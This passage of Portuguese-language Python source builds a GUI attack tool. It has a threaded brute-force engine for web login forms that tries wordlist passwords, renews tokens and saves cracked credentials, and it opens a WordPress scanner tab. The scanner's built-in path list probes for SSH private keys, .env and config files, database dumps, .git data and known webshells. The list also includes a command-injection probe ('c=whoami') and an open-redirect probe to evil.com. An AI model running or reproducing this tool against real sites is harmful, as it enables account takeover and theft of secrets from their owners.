            with open(path, "w", encoding="utf-8") as f:
                f.write(texto)
            messagebox.showinfo("Salvar Senha", f"Senha salva:\n{path}")
        except Exception as e:
            messagebox.showerror("Salvar Senha", f"Falha ao salvar:\n{e}")

    def log(self, msg):
        self.queue.put(("log", msg))

    def progress(self, i, total, pwd=""):
        self.proximo_indice = i
        self.queue.put(("progress", (i, total, pwd)))

    def done(self, msg):
        self.queue.put(("done", msg))

    def on_resultado(self, usuario, senha):
        self.queue.put(("resultado", (usuario, senha)))

    def _poll_queue(self):
        try:
            while True:
                kind, payload = self.queue.get_nowait()
                if kind == "log":
                    log_insert(self.log_area, payload)
                elif kind == "progress":
                    i, total, pwd = payload
                    pct = (i / total) * 100 if total else 0
                    self.progress_var.set(pct)
                    self.status_var.set(f"[{i}/{total}] ({pct:.1f}%) Testando:   {pwd}")
                elif kind == "resultado":
                    self.senha_encontrada = payload
                    usuario, senha = payload
                    self.status_var.set(f"[+] Senha encontrada: {usuario} : {senha} | "
                                        f"Clique em Salvar Senha")
                elif kind == "done":
                    self.btn_start.configure(state="normal")
                    self.btn_stop.configure(state="disabled")
                    if not self.senha_encontrada:
                        self.status_var.set(payload)
        except queue.Empty:
            pass
        self.after(100, self._poll_queue)

    def start(self):
        if self.worker is not None and self.worker.is_alive():
            self.status_var.set("Aguardando o ataque anterior parar completamente...")
            self.after(250, self.start)
            return

        url = self.url_var.get().strip()
        user = self.user_var.get().strip()
        wl_path = self.wordlist_var.get().strip()
        verbose = self.verbose_var.get()
        renovar = self.token_var.get()
        delay = self.delay_var.get()

        if not url or not user:
            messagebox.showerror("Erro", "Informe a URL e o usuário.")
            return
        if wl_path:
            if not os.path.isfile(wl_path):
                messagebox.showerror("Erro", f"Arquivo não encontrado:\n{wl_path}")
                return
            try:
                with open(wl_path, "r", encoding="utf-8", errors="ignore") as f:
                    passwords = [linha.strip() for linha in f if linha.strip()]
            except Exception as e:
                messagebox.showerror("Erro", f"Falha ao ler wordlist:\n{e}")
                return
            if not passwords:
                messagebox.showerror("Erro", "Wordlist vazia.")
                return
        else:
            passwords = DEFAULT_WORDLIST[:]

        manual = None
        if self.manual_var.get():
            action = self.man_action_var.get().strip()
            user_field = self.man_user_var.get().strip()
            pass_field = self.man_pass_var.get().strip()
            token_field = self.man_token_var.get().strip()
            method = self.man_method_var.get().strip().lower() or "post"
            if not (action and user_field and pass_field):
                messagebox.showerror(
                    "Erro", "Modo manual: preencha Action, campo usuário e campo senha.")
                return
            manual = {
                "action": action,
                "method": method,
                "user_field": user_field,
                "pass_field": pass_field,
                "token_field": token_field or None,
                "extra": parse_campos_extras(self.man_extra_var.get()),
            }

        wl_fonte = wl_path if wl_path else "builtin"
        if self.fonte_wordlist and self.fonte_wordlist != wl_fonte:
            self.proximo_indice = 0
            self.log("[*] Wordlist alterada -> recomeçando do início.")
        self.fonte_wordlist = wl_fonte

        inicio = 0
        if self.proximo_indice > 0:
            if self.proximo_indice >= len(passwords):
                self.proximo_indice = 0
                self.log("[*] Ataque anterior chegou ao fim da lista -> recomeçando do início.")
            else:
                inicio = self.proximo_indice

        resumindo = inicio > 0

        if not resumindo and not wl_path:
            self.log("[*] Nenhuma wordlist selecionada -> lista embutida de demonstração.")

        self.stop_event.clear()
        self.senha_encontrada = None
        self.btn_start.configure(state="disabled")
        self.btn_stop.configure(state="normal")
        self.progress_var.set((inicio / len(passwords)) * 100 if passwords else 0)
        self.log_area.configure(state="normal")
        if not resumindo:
            self.log_area.delete("1.0", "end")
        self.log_area.configure(state="disabled")

        engine = BruteForceLogin(url, user, passwords, self.log, self.progress,
                                 self.stop_event, self.on_resultado,
                                 verbose=verbose, renovar_token=renovar,
                                 delay=delay, inicio=inicio, manual=manual)
        self.worker = threading.Thread(target=self._run_engine, args=(engine,),
                                       daemon=True)
        self.worker.start()

    def _run_engine(self, engine):
        try:
            engine.run()
        except Exception as e:
            self.log(f"[!] Erro inesperado: {type(e).__name__}: {e}")
        finally:
            if engine.found:
                self.proximo_indice = 0
                self.done("Ataque finalizado. Senha encontrada (veja o log) — use 'Salvar Senha'.")
            elif self.parado_pelo_usuario:
                self.done("Ataque interrompido. Clique em 'Iniciar Ataque' para continuar de onde parou.")
            else:
                self.proximo_indice = 0
                self.done("Ataque finalizado. Nenhuma senha válida nas tentativas.")
            self.parado_pelo_usuario = False

    def stop(self):
        self.stop_event.set()
        self.parado_pelo_usuario = True
        self.status_var.set("Parando... aguarde a tentativa atual terminar.")


# =====================================================================
# ABA 4 — WP-SCANNER (WordPress: scan de arquivos + brute force)
# =====================================================================
WP_UA = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) WP-GUI-Scanner/2.6"}
WP_URL_FIXA = "http://192.168.0.13/wordpress"

# Fallback embutido (usado se lista_diretorios.txt não existir)
WORDPRESS_PATHS_PADRAO = [
    "!.gitignore",
    "!.htaccess",
    "!.htpasswd",
    "%3f/",
    "%ff/",
    ".7z",
    ".access",
    ".addressbook",
    ".adm",
    ".admin",
    ".adminer.php.swp",
    ".apdisk",
    ".AppleDB",
    ".AppleDesktop",
    ".AppleDouble",
    ".Backup",
    ".bak",
    ".bash_history",
    ".bash_logout",
    ".bash_profile",
    ".bashrc",
    ".bower-cachez",
    ".bower-registry",
    ".bower-tmp",
    ".build/",
    ".buildpath",
    ".buildpath/",
    ".builds",
    ".bundle",
    ".bz2",
    ".bzr/README",
    ".c9/",
    ".c9revisions/",
    ".cache",
    ".cache/",
    ".capistrano",
    ".capistrano/metrics",
    ".cc-ban.txt",
    ".cc-ban.txt.bak",
    ".cfg",
    ".checkstyle",
    ".classpath",
    ".claude/CLAUDE.md",
    ".claude/settings.json",
    ".cobalt",
    ".codeintel",
    ".codekit-cache",
    ".codio",
    ".compile",
    ".composer",
    ".conf",
    ".config",
    ".config.php.swp",
    ".configuration.php.swp",
    ".contracts",
    ".core",
    ".coverage",
    ".coveralls.yml",
    ".cpan",
    ".cpanel/",
    ".cproject",
    ".cshrc",
    ".CSV",
    ".CVS",
    ".cvsignore",
    ".dat",
    ".deployignore",
    ".dev/",
    ".directory",
    ".dockerignore",
    ".DS_Store",
    ".dump",
    ".eclipse",
    ".editorconfig",
    ".elasticbeanstalk/",
    ".elb",
    ".elc",
    ".emacs.desktop",
    ".emacs.desktop.lock",
    ".empty-folder",
    ".env",
    ".env-example",
    ".env.php",
    ".env.bak",
    ".env.sample.php",
    ".environment",
    ".error_log",
    ".esformatter",
    ".eslintignore",
    ".eslintrc",
    ".espressostorage",
    ".external/data",
    ".externalToolBuilders/",
    ".FBCIndex",
    ".fhp",
    ".filemgr-tmp",
    ".fishsrv.pl",
    ".flac",
    ".flowconfig",
    ".fontconfig/",
    ".fontcustom-manifest.json",
    ".forward",
    ".ftp-access",
    ".ftppass",
    ".ftpquota",
    ".gem",
    ".git",
    ".git-rewrite/",
    ".git/",
    ".git/config",
    ".git/HEAD",
    ".git/index",
    ".git/logs/",
    ".git/logs/HEAD",
    ".git/logs/refs",
    ".git2/",
    ".git_release",
    ".gitattributes",
    ".gitconfig",
    ".gitignore",
    ".gitignore.swp",
    ".gitignore_global",
    ".gitignore~",
    ".gitk",
    ".gitkeep",
    ".gitlab",
    ".gitlab-ci.yml",
    ".gitlab/issue_templates",
    ".gitlab/merge_request_templates",
    ".gitlab/route-map.yml",
    ".gitmodules",
    ".gitreview",
    ".grunt/",
    ".gz",
    ".hash",
    ".hg",
    ".hg/",
    ".hg/dirstate",
    ".hg/requires",
    ".hg/store/data/",
    ".hg/store/undo",
    ".hg/undo.dirstate",
    ".hgignore",
    ".hgignore.global",
    ".hgrc",
    ".history",
    ".ht_wsr.txt",
    ".hta",
    ".htaccess",
    ".htaccess-dev",
    ".htaccess-local",
    ".htaccess-marco",
    ".htaccess.BAK",
    ".htaccess.bak1",
    ".htaccess.old",
    ".htaccess.orig",
    ".htaccess.sample",
    ".htaccess.save",
    ".htaccess.txt",
    ".htaccess_extra",
    ".htaccess_orig",
    ".htaccess_sc",
    ".htaccessBAK",
    ".htaccessOLD",
    ".htaccessOLD2",
    ".htaccess~",
    ".htgroup",
    ".htpasswd",
    ".htpasswd-old",
    ".htpasswd_test",
    ".htpasswds",
    ".htusers",
    ".idea",
    ".idea/",
    ".idea/.name",
    ".idea/compiler.xml",
    ".idea/copyright/profiles_settings.xml",
    ".idea/dataSources.ids",
    ".idea/dataSources.xml",
    ".idea/deployment.xml",
    ".idea/drush_stats.iml",
    ".idea/encodings.xml",
    ".idea/misc.xml",
    ".idea/modules.xml",
    ".idea/scopes/scope_settings.xml",
    ".idea/Sites.iml",
    ".idea/sqlDataSources.xml",
    ".idea/tasks.xml",
    ".idea/uiDesigner.xml",
    ".idea/vcs.xml",
    ".idea/woaWordpress.iml",
    ".idea/workspace(2).xml",
    ".idea/workspace(3).xml",
    ".idea/workspace(4).xml",
    ".idea/workspace(5).xml",
    ".idea/workspace(6).xml",
    ".idea/workspace(7).xml",
    ".idea/workspace.xml",
    ".idea0/",
    ".idea_modules/",
    ".ignore",
    ".ignored/",
    ".ini",
    ".inst/",
    ".install/composer.phar",
    ".installed.cfg",
    ".joe_state",
    ".jrubyrc",
    ".jscsrc",
    ".jsfmtrc",
    ".jshintignore",
    ".jshintrc",
    ".keep",
    ".komodotools",
    ".komodotools/",
    ".lesshst",
    ".lighttpd.conf",
    ".listing",
    ".listings",
    ".loadpath",
    ".LOCAL",
    ".localeapp/",
    ".localsettings.php.swp",
    ".lock-wscript",
    ".log",
    ".login",
    ".login_conf",
    ".LSOverride",
    ".lynx_cookies",
    ".magentointel-cache/",
    ".mail_aliases",
    ".mailrc",
    ".maintenance",
    ".maintenance2",
    ".mc",
    ".mc/",
    ".memdump",
    ".mergesources.yml",
    ".meta",
    ".metadata",
    ".metadata/",
    ".modgit/",
    ".modman",
    ".modman/",
    ".modules",
    ".mr.developer.cfg",
    ".msi",
    ".mweval_history",
    ".mwsql_history",
    ".mysql_history",
    ".nbproject/",
    ".netrc",
    ".netrwhist",
    ".nodelete",
    ".npmignore",
    ".npmrc",
    ".nsconfig",
    ".old",
    ".oldsnippets",
    ".oldstatic",
    ".org-id-locations",
    ".ost",
    ".passwd",
    ".patches/",
    ".perf",
    ".php-ini",
    ".php-version",
    ".php_history",
    ".phperr.log",
    ".phpintel",
    ".phpstorm.meta.php",
    ".phptidy-cache",
    ".phpversion",
    ".pki",
    ".placeholder",
    ".playground",
    ".procmailrc",
    ".profile",
    ".project",
    ".project.xml",
    ".project/",
    ".projectOptions",
    ".properties",
    ".psql_history",
    ".pst",
    ".pydevproject",
    ".python-eggs",
    ".qqestore/",
    ".rar",
    ".raw",
    ".rbtp",
    ".rdsTempFiles",
    ".remote-sync.json",
    ".revision",
    ".rhosts",
    ".robots.txt",
    ".rsync_cache",
    ".rsync_cache/",
    ".rtlcssrc",
    ".rubocop.yml",
    ".rubocop_todo.yml",
    ".ruby-gemset",
    ".ruby-version",
    ".rvmrc",
    ".s3backupstatus",
    ".sass-cache/",
    ".scrutinizer.yml",
    ".selected_editor",
    ".sencha/",
    ".settings",
    ".settings.php.swp",
    ".settings/",
    ".settings/.jsdtscope",
    ".settings/org.eclipse.core.resources.prefs",
    ".settings/org.eclipse.php.core.prefs",
    ".settings/org.eclipse.wst.common.project.facet.core.xml",
    ".settings/org.eclipse.wst.jsdt.ui.superType.container",
    ".settings/org.eclipse.wst.jsdt.ui.superType.name",
    ".sh",
    ".sh_history",
    ".shrc",
    ".simplecov",
    ".sln",
    ".smushit-status",
    ".spamassassin",
    ".sql",
    ".sql.bz2",
    ".sql.gz",
    ".sqlite_history",
    ".ssh",
    ".ssh.asp",
    ".ssh.php",
    ".ssh/authorized_keys",
    ".ssh/id_rsa",
    ".ssh/id_rsa.key",
    ".ssh/id_rsa.key~",
    ".ssh/id_rsa.priv",
    ".ssh/id_rsa.priv~",
    ".ssh/id_rsa.pub",
    ".ssh/id_rsa.pub~",
    ".ssh/id_rsa~",
    ".ssh/know_hosts",
    ".ssh/know_hosts~",
    ".ssh/known_host",
    ".ssh/identity",
    ".ssh/id_dsa",
    ".ssh/id_ecdsa",
    ".ssh/id_ed25519",
    ".ssh/id_ecdsa_sk",
    ".ssh/id_ed25519_sk",
    ".ssh/identity~",
    ".ssh/id_dsa~",
    ".ssh/id_ecdsa~",
    ".ssh/id_ed25519~",
    ".ssh/id_ecdsa_sk~",
    ".ssh/id_ed25519_sk~",
    ".ssh/identity.pub",
    ".ssh/id_dsa.pub",
    ".ssh/id_ecdsa.pub",
    ".ssh/id_ed25519.pub",
    ".ssh/id_ecdsa_sk.pub",
    ".ssh/id_ed25519_sk.pub",
    ".ssh/identity.pub~",
    ".ssh/id_dsa.pub~",
    ".ssh/id_ecdsa.pub~",
    ".ssh/id_ed25519.pub~",
    ".ssh/id_ecdsa_sk.pub~",
    ".ssh/id_ed25519_sk.pub~",
    ".ssh/identity.key",
    ".ssh/id_dsa.key",
    ".ssh/id_ecdsa.key",
    ".ssh/id_ed25519.key",
    ".ssh/id_ecdsa_sk.key",
    ".ssh/id_ed25519_sk.key",
    ".ssh/identity.key~",
    ".ssh/id_dsa.key~",
    ".ssh/id_ecdsa.key~",
    ".ssh/id_ed25519.key~",
    ".ssh/id_ecdsa_sk.key~",
    ".ssh/id_ed25519_sk.key~",
    ".ssh/identity.priv",
    ".ssh/id_dsa.priv",
    ".ssh/id_ecdsa.priv",
    ".ssh/id_ed25519.priv",
    ".ssh/id_ecdsa_sk.priv",
    ".ssh/id_ed25519_sk.priv",
    ".ssh/identity.priv~",
    ".ssh/id_dsa.priv~",
    ".ssh/id_ecdsa.priv~",
    ".ssh/id_ed25519.priv~",
    ".ssh/id_ecdsa_sk.priv~",
    ".ssh/id_ed25519_sk.priv~",
    ".ssh/id_rsa_key",
    ".ssh/identity_key",
    ".ssh/id_dsa_key",
    ".ssh/id_ecdsa_key",
    ".ssh/id_ed25519_key",
    ".ssh/id_ecdsa_sk_key",
    ".ssh/id_ed25519_sk_key",
    ".ssh/id_rsa_key~",
    ".ssh/identity_key~",
    ".ssh/id_dsa_key~",
    ".ssh/id_ecdsa_key~",
    ".ssh/id_ed25519_key~",
    ".ssh/id_ecdsa_sk_key~",
    ".ssh/id_ed25519_sk_key~",
    ".ssh/id_rsa_key.pub",
    ".ssh/identity_key.pub",
    ".ssh/id_dsa_key.pub",
    ".ssh/id_ecdsa_key.pub",
    ".ssh/id_ed25519_key.pub",
    ".ssh/id_ecdsa_sk_key.pub",
    ".ssh/id_ed25519_sk_key.pub",
    ".ssh/id_rsa_key.pub~",
    ".ssh/identity_key.pub~",
    ".ssh/id_dsa_key.pub~",
    ".ssh/id_ecdsa_key.pub~",
    ".ssh/id_ed25519_key.pub~",
    ".ssh/id_ecdsa_sk_key.pub~",
    ".ssh/id_ed25519_sk_key.pub~",
    ".st_cache/",
    ".sublime-gulp.cache",
    ".sublime-project",
    ".sublime-workspace",
    ".subversion",
    ".sucuriquarantine/",
    ".sunw",
    ".svn",
    ".svn/",
    ".svn/entries",
    ".svnignore",
    ".sw",
    ".swf",
    ".swo",
    ".swp",
    ".SyncID",
    ".SyncIgnore",
    ".synthquota",
    ".system/sitemap.xml",
    ".tags",
    ".tags_sorted_by_file",
    ".tar",
    ".tar.bz2",
    ".tar.gz",
    ".temp",
    ".tgitconfig",
    ".thumbs",
    ".tmp",
    ".tmproj",
    ".tox",
    ".transients_purge.log",
    ".Trash",
    ".Trashes",
    ".travis.yml",
    ".tx/",
    ".user.ini",
    ".vacation.cache",
    ".vagrant",
    ".version",
    ".vgextensions/",
    ".viminfo",
    ".vimrc",
    ".web",
    ".workspace/",
    ".wp-config.php.swp",
    ".yardopts",
    ".zeus.sock",
    ".zfs/",
    ".zip",
    "0.htpasswd",
    "0.php",
    "1.htaccess",
    "1.htpasswd",
    "1.php",
    "1.tar",
    "1.tar.bz2",
    "1.tar.gz",
    "1.txt",
    "1.zip",
    "1/",
    "123.php",
    "123.txt",
    "1c/",
    "2.php",
    "2.tar",
    "2.tar.bz2",
    "2.tar.gz",
    "2.txt",
    "2.zip",
    "3.php",
    "4.php",
    "5.php",
    "6.php",
    "7.php",
    "8.php",
    "9.php",
    "_.htpasswd",
    "__cache/",
    "__index.php",
    "__ma/",
    "__MACOSX",
    "__pma___/",
    "__SQL",
    "__test.php",
    "_adm",
    "_admin",
    "_common.xsl",
    "_config.inc",
    "_data/",
    "_data/error_log",
    "_errors",
    "_files",
    "_include",
    "_index.php",
    "_install",
    "_layouts",
    "_legacy",
    "_log/",
    "_log/access-log",
    "_log/access.log",
    "_log/access_log",
    "_log/error-log",
    "_log/error.log",
    "_log/error_log",
    "_logs",
    "_logs/",
    "_logs/access-log",
    "_logs/access.log",
    "_logs/access_log",
    "_logs/error-log",
    "_logs/error.log",
    "_logs/error_log",
    "_mmServerScripts/MMHTTPDB.asp",
    "_mmServerScripts/MMHTTPDB.php",
    "_notes/dwsync.xml",
    "_novo/composer.lock",
    "_old",
    "_pages",
    "_phpmyadmin/",
    "_private",
    "_source",
    "_SQL",
    "_sqladm",
    "_src",
    "_test",
    "_vti_inf.html",
    "_vti_pvt/service.cnf",
    "_WEB_INF/",
    "_www",
    "abton/spaw2/dialogs/dialog.php",
    "acceptance_config.yml",
    "access-log",
    "access.log",
    "access.phtml",
    "access_log",
    "accesslog",
    "accesslogs",
    "account.php",
    "account.sql",
    "accounts",
    "accounts.sql",
    "accounts.txt",
    "activity",
    "add.php",
    "adduser",
    "adm",
    "adm.php",
    "adm/",
    "adm/spaw2/dialogs/dialog.php",
    "adm/upload.php",
    "admin%20/",
    "admin-console",
    "admin-console/",
    "admin-serv/",
    "admin-serv/config/admpw",
    "admin.dat",
    "admin.htm",
    "admin.html",
    "admin.mdb",
    "admin.php",
    "Admin/",
    "admin/.config",
    "admin/.htaccess",
    "admin/_dump/",
    "admin/access.log",
    "admin/access.txt",
    "admin/access_log",
    "admin/adminer.php",
    "admin/backup/",
    "admin/backups/",
    "admin/bootstrap.inc.php?mgp=danc3Uf@t&c=whoami",
    "admin/db/",
    "admin/download.php",
    "admin/dumper/",
    "admin/editor/dialogs/dialog.php?module=spawfm&dialog=spawfm&theme=spaw2lite&type=imagesundefined",
    "admin/error.log",
    "admin/error.txt",
    "admin/error_log",
    "admin/export.php",
    "admin/FCKeditor",
    "admin/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp",
    "admin/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx",
    "admin/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php",
    "admin/fckeditor/editor/filemanager/connectors/asp/connector.asp",
    "admin/fckeditor/editor/filemanager/connectors/asp/upload.asp",
    "admin/fckeditor/editor/filemanager/connectors/aspx/connector.aspx",
    "admin/fckeditor/editor/filemanager/connectors/aspx/upload.aspx",
    "admin/fckeditor/editor/filemanager/connectors/php/connector.php",
    "admin/fckeditor/editor/filemanager/connectors/php/upload.php",
    "admin/fckeditor/editor/filemanager/upload/asp/upload.asp",
    "admin/fckeditor/editor/filemanager/upload/aspx/upload.aspx",
    "admin/fckeditor/editor/filemanager/upload/php/upload.php",
    "admin/heapdump",
    "admin/include/spaw2/dialogs/dialog.php",
    "admin/includes/configure.php~",
    "admin/js/tiny_mce/",
    "admin/js/tinymce/",
    "admin/lib/spaw2/dialogs/dialog.php",
    "admin/log",
    "admin/logs/",
    "admin/logs/login.txt",
    "admin/phpMyAdmin/",
    "admin/phpmyadmin/scripts/setup.php",
    "admin/pma/",
    "admin/pma/scripts/setup.php",
    "admin/pol_log.txt",
    "admin/private/logs",
    "admin/scripts/setup.php",
    "admin/spaw/dialogs/dialog.php?module=spawfm&dialog=spawfm&theme=spaw2lite&type=imagesundefined",
    "admin/spaw2/dialogs/dialog.php?module=spawfm&dialog=spawfm&theme=spaw2lite&type=imagesundefined",
    "admin/sxd/",
    "admin/test/",
    "admin/upload.php",
    "admin/uploadarticles/uploadTester.asp",
    "admin/user_count.txt",
    "admin0",
    "admin1",
    "admin1.php",
    "admin1/",
    "admin2.asp",
    "admin2.old/",
    "admin2.php",
    "admin2/",
    "admin_",
    "admin_files",
    "admin_login",
    "admin_logon",
    "adminconsole",
    "admincontrol.php",
    "admincp/",
    "admincp/js/kindeditor/",
    "admincp/upload/",
    "adminer-4.0.3-mysql.php",
    "adminer-4.0.3.php",
    "adminer-4.1.0-mysql.php",
    "adminer-4.1.0.php",
    "adminer-4.2.0-mysql.php",
    "adminer-4.2.0.php",
    "adminer.php",
    "adminer.sql",
    "adminer/",
    "adminer/adminer.php",
    "administracao.php",
    "administracion.php",
    "administrateur.php",
    "administration.php",
    "administration/",
    "administration/Sym.php",
    "administrative/",
    "administrative/login_history",
    "administrator.php",
    "administrator/",
    "administrator/.htaccess",
    "administrator/components/com_joommyadmin/phpmyadmin/",
    "administrator/logs",
    "administrators.pwd",
    "adminpanel.html",
    "adminpanel.php",
    "adminpanel/",
    "admins.asp",
    "admins.php",
    "admins/",
    "admins/backup/",
    "admins/log.txt",
    "admpar/.ftppass",
    "admrev/.ftppass",
    "admrev/_files/",
    "adsystem",
    "affiliates.sql",
    "ajax/app/yahoo/yahoo.htm",
    "alfa/",
    "all.sql",
    "altair",
    "amad.php",
    "amministratore.php",
    "answers/error_log",
    "apache-default/phpmyadmin/",
    "apache/logs/access.log",
    "apache/logs/access_log",
    "apache/logs/error.log",
    "apache/logs/error_log",
    "apc-nrp.php",
    "apc.php",
    "apc/apc.php",
    "apc/index.php",
    "api/",
    "api/user",
    "api/batch",
    "api/error_log",
    "api/proxy",
    "apibuild.pyc",
    "app.config",
    "app.js",
    "app.json",
    "app/.htaccess",
    "app/bin",
    "app/composer.json",
    "app/composer.lock",
    "app/config/adminConf.json",
    "app/config/database.yml",
    "app/config/database.yml.pgsql",
    "app/config/database.yml.sqlite3",
    "app/config/database.yml_original",
    "app/config/database.yml~",
    "app/config/databases.yml",
    "app/config/global.json",
    "app/config/parameters.ini",
    "app/config/parameters.yml",
    "app/config/routes.cfg",
    "app/config/schema.yml",
    "app/dev",
    "app/docs",
    "app/etc/config.xml",
    "app/etc/enterprise.xml",
    "app/etc/fpc.xml",
    "app/etc/local.additional",
    "app/etc/local.xml",
    "app/etc/local.xml.additional",
    "app/etc/local.xml.bak",
    "app/etc/local.xml.live",
    "app/etc/local.xml.localRemote",
    "app/etc/local.xml.phpunit",
    "app/etc/local.xml.template",
    "app/etc/local.xml.vmachine",
    "app/etc/local.xml.vmachine.rm",
    "app/languages",
    "app/log/",
    "app/logs/",
    "app/phpunit.xml",
    "app/src",
    "app/sys",
    "app/testing",
    "app/unschedule.bat",
    "app/vendor",
    "app/vendor-src",
    "app_dev.php",
    "appcache.manifest",
    "application.log",
    "application.wadl",
    "application/cache/",
    "application/logs/",
    "apps/frontend/config/app.yml",
    "apps/frontend/config/databases.yml",
    "appspec.yml",
    "asp.aspx",
    "aspnet_webadmin",
    "aspwpadmin",
    "aspxspy.aspx",
    "assets/fckeditor",
    "assets/js/fckeditor",
    "assets/npm-debug.log",
    "asterisk.log",
    "atlassian-ide-plugin.xml",
    "auth.inc",
    "auth.php",
    "auth_user_file.txt",
    "authorization.config",
    "authorized_keys",
    "autobackup.php",
    "awstats",
    "awstats.pl",
    "awstats/",
    "azureadmin/",
    "b2badmin/",
    "back.sql",
    "backdoor.php",
    "backdoor/",
    "backup",
    "backup.7z",
    "backup.htpasswd",
    "backup.inc",
    "backup.inc.old",
    "backup.old",
    "backup.rar",
    "backup.sql",
    "backup.sql.old",
    "backup.tar",
    "backup.tar.bz2",
    "backup.tar.gz",
    "backup.tgz",
    "backup.zip",
    "backup/",
    "backup0/",
    "backup1/",
    "backup123/",
    "backup2/",
    "backup2010.sql",
    "backup2011.sql",
    "backup2012.sql",
    "backup2013.sql",
    "backup2014.sql",
    "backup2015.sql",
    "backup2016.sql",
    "backup2017.sql",
    "backup2018.sql",
    "backup2019.sql",
    "backup2020.sql",
    "backup2021.sql",
    "backup2022.sql",
    "backup2023.sql",
    "backup2024.sql",
    "backup2025.sql",
    "backup2026.sql",
    "backups",
    "backups.7z",
    "backups.inc",
    "backups.inc.old",
    "backups.old",
    "backups.rar",
    "backups.sql",
    "backups.sql.old",
    "backups.tar",
    "backups.tar.bz2",
    "backups.tar.gz",
    "backups.tgz",
    "backups.zip",
    "backups/",
    "base/",
    "bb-admin/",
    "bd.sql",
    "beans",
    "beta/",
    "bigdump.php",
    "billing",
    "billing/killer.php",
    "bin/config.sh",
    "bin/reset-db-prod.sh",
    "bin/reset-db.sh",
    "BingSiteAuth.xml",
    "bitrix/admin/i.php",
    "bitrix/admin/index.php",
    "bitrix/admin/info.php",
    "bitrix/admin/p.php",
    "bitrix/admin/php.php",
    "bitrix/admin/phpinfo.php",
    "bitrix/authorization.config",
    "bitrix/backup/",
    "bitrix/dumper/",
    "bitrix/error.log",
    "bitrix/import/",
    "bitrix/import/files",
    "bitrix/import/import",
    "bitrix/import/m_import",
    "bitrix/logs/",
    "bitrix/modules/error.log",
    "bitrix/modules/error.log.old",
    "bitrix/modules/main/admin/restore.php",
    "bitrix/modules/main/classes/mysql/agent.php",
    "bitrix/modules/smtpd.log",
    "bitrix/modules/updater.log",
    "bitrix/modules/updater_partner.log",
    "bitrix/otp/",
    "bitrix/php_interface/dbconn.1",
    "bitrix/php_interface/dbconn.2",
    "bitrix/php_interface/dbconn.bak",
    "bitrix/php_interface/dbconn.dist",
    "bitrix/php_interface/dbconn.old",
    "bitrix/php_interface/dbconn.php.bak",
    "bitrix/php_interface/dbconn.php.dist",
    "bitrix/php_interface/dbconn.php.old",
    "bitrix/php_interface/dbconn.php.save",
    "bitrix/php_interface/dbconn.php.swp",
    "bitrix/php_interface/dbconn.php.templ",
    "bitrix/php_interface/dbconn.php.txt",
    "bitrix/php_interface/dbconn.php2",
    "bitrix/php_interface/dbconn.save",
    "bitrix/php_interface/dbconn.swp",
    "bitrix/php_interface/dbconn.txt",
    "bitrix/rk.php?goto=http://evil.com",
    "bitrix/web.config",
    "biy/upload/",
    "Black.php",
    "blacklist.dat",
    "blog/error_log",
    "blog/phpmyadmin/",
    "blog/wp-content/backup-db/",
    "blog/wp-content/backups/",
    "bot.txt",
    "bower.json",
    "buck.sql",
    "build.gradle",
    "build.local.xml",
    "build.sh",
    "build.xml",
    "build/build.properties",
    "build/buildinfo.properties",
    "build_config_private.ini",
    "c-h.v2.php",
    "c100.php",
    "c22.php",
    "c99.php",
    "c99shell.php",
    "cache/",
    "cache/sql_error_latest.cgi",
    "Capfile",
    "cc-errors.txt",
    "cc-log.txt",
    "ccbill.log",
    "cell.xml",
    "cfajax/app/yahoo/yahoo.htm",
    "cgi-bin/awstats.pl",
    "cgi.pl/",
    "Cgishell.pl",
    "change.log",
    "changeall.php",
    "ChangeLog",
    "CHANGELOG.txt",
    "CHANGES.html",
    "changes.txt",
    "charts",
    "checked_accounts.txt",
    "chubb.xml",
    "cidr.txtа",
    "citrix/",
    "Citrix/PNAgent/config.xml",
    "citydesk.xml",
    "ckeditor",
    "ckeditor/",
    "ckeditor/ckfinder/ckfinder.html",
    "ckeditor/ckfinder/core/connector/asp/connector.asp",
    "ckeditor/ckfinder/core/connector/aspx/connector.aspx",
    "ckeditor/ckfinder/core/connector/php/connector.php",
    "ckfinder/ckfinder.html",
    "classes/adodb/server.php",
    "classes/cookie.txt",
    "CLAUDE.md",
    "cleanup.log",
    "ClientAccessPolicy.xml",
    "cliente/downloads/h4xor.php",
    "clients.mdb",
    "clients.sql",
    "clients.sqlite",
    "clients.zip",
    "cmdasp.asp",
    "cms-admin",
    "cms.csproj",
    "cms/",
    "cms/cms.csproj",
    "cms/spaw2/dialogs/dialog.php",
    "cms/Web.config",
    "code/",
    "codeception.yml",
    "common.inc",
    "common.xml",
    "common/config/api.ini",
    "common/config/db.ini",
    "composer.json",
    "composer.lock",
    "composer.phar",
    "composer/installed.json",
    "conf/",
    "conf/server.xml",
    "config.bak",
    "config.bat",
    "config.codekit",
    "config.core",
    "config.dat",
    "config.dist",
    "config.inc",
    "config.inc.bak",
    "config.inc.old",
    "config.inc.php",
    "config.inc.php-eb",
    "config.inc.php.bak",
    "config.inc.php.dist",
    "config.inc.php.inc",
    "config.inc.php.inc~",
    "config.inc.php.old",
    "config.inc.php.save",
    "config.inc.php.swp",
    "config.inc.php.templ",
    "config.inc.php.txt",
    "config.inc.php~",
    "config.inc.txt",
    "config.inc~",
    "config.ini",
    "config.ini.bak",
    "config.ini.old",
    "config.ini.txt",
    "config.json",
    "config.json.cfm",
    "config.local",
    "config.old",
    "config.php",
    "config.php-eb",
    "config.php.bak",
    "config.php.dist",
    "config.php.inc",
    "config.php.inc~",
    "config.php.old",
    "config.php.save",
    "config.php.swp",
    "config.php.templ",
    "config.php.txt",
    "config.php~",
    "config.rb",
    "config.save",
    "config.swp",
    "config.txt",
    "config.xml",
    "config.yml",
    "config.yml.templ",
    "Config/",
    "config/apc.php",
    "config/app.yml",
    "config/AppData.config",
    "config/application.ini",
    "config/aws.yml",
    "config/banned_words.txt",
    "config/config.inc.php",
    "config/config.inc.php.bak",
    "config/config.inc.php.dist",
    "config/config.ini",
    "config/database.yml",
    "config/database.yml.pgsql",
    "config/database.yml.sqlite3",
    "config/database.yml_original",
    "config/database.yml~",
    "config/databases.yml",
    "config/dbconfig.ini",
    "config/monkcheckout.ini",
    "config/monkdonate.ini",
    "config/monkid.ini",
    "config/producao.ini",
    "config/routes.yml",
    "config/settings.inc",
    "config/settings.ini",
    "config/settings.ini.cfm",
    "config/settings.local.yml",
    "config/settings/production.yml",
    "configs/conf_bdd.ini",
    "configs/conf_zepass.ini",
    "configuration.ini",
    "configuration.php",
    "configuration.php.bak",
    "configuration.php.dist",
    "configuration.php.old",
